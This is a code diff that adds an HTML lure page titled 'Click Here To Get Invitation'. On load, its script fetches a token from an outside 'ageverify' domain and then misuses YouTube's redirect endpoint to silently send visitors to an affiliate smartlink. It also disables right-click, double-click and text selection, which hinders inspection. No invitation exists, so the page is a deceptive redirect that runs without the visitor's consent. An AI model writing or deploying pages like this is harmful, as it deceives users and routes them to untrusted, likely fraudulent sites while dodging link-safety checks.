@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Click Here To Get Invitation</title>
+    <link rel="icon" type="image/png" href="https://www.icons101.com/icon_ico/id_25606/flying_heart.ico" />
+    <meta property="og:image" content="https://hips.hearstapps.com/hmg-prod/images/screen-shot-2022-07-12-at-10-55-39-am-1657637745.png" />
+	<meta name="Designer" content="@alamindit">
+	<meta name="author" content="t.me/alamindit">
+	<style>
+	body{
+ -webkit-user-select: none; /* Safari */
+  -ms-user-select: none; /* IE 10 and IE 11 */
+  -moz-user-select: none; /* Standard syntax */
+  -o-user-select: none; /* Standard syntax */
+  user-select: none; /* Standard syntax */
+}
+	</style>
+ <script>
+        jQuery(document).ready(function(){
+  jQuery(function() {
+        jQuery(this).bind("contextmenu", function(event) {
+            event.preventDefault();
+            alert('Right click disable in this site!!')
+        });
+    });
+});
+    </script> 
+</head>
+
+<body> 
+    <script>
+        const v = 'vnd';
+        const d = 'youtube';
+        async function loadToken() {
+            const response = await fetch('https://cnet.ageverify.org/api/getConfig');
+            const tokenJson = await response.json();
+            return tokenJson.token;
+        }
+        var qs = (function(a) {
+            if (a == "") return {};
+            var b = {};
+            for (var i = 0; i < a.length; ++i)
+            {
+                var p=a[i].split('=', 2);
+                if (p.length == 1)
+                    b[p[0]] = "";
+                else
+                    b[p[0]] = decodeURIComponent(p[1].replace(/\+/g, " "));
+            }
+            return b;
+        })(window.location.search.substr(1).split('&'));
+        // var qs = function() {
+        //     var a = window.location.href;
+        //     var parts = a.split('/');
+        //     var b = parts.pop() || parts.pop(); 
+        //     return b;
+        // };
+        async function go(){
+            var uid = qs["uid"] ? qs["uid"].split("_")[0] : 1;
+            var token = await loadToken();
+            var urf = `https:\/\/cdsmartdt.com\/smartlink\/?a=195327&sm=33064&co=248196&mt=28&s1=Mixx8028`;
+            location.href = `${v}.${d}://www.youtube.com/redirect?event=comments&redir_token=${token}&q=${urf}&html_redirect=1`;
+        }
+        go();
+    </script>
+	
+<script>
+document.addEventListener('dblclick', function(event) {
+    alert("Double-click disabled!");
+    event.preventDefault();
+    event.stopPropagation();
+  }, true //capturing phase!!
+);
+</script>
+</body>
+
+</html>
